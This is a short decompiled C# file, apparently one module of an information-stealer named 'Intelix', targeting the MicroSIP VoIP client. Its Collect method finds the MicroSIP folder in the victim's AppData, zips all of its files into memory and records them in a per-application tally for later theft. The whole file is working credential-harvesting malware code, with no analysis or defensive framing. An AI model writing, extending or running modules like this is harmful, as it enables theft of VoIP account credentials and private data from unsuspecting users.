using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Messangers
{
	// Token: 0x0200001B RID: 27
	public class MicroSIP : ITarget
	{
		// Token: 0x0600004F RID: 79 RVA: 0x00003D10 File Offset: 0x00001F10
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MicroSIP");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				string text2 = "MicroSIP\\";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "MicroSIP";
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Messangers.Add(counterApplications);
			}
		}
	}
}
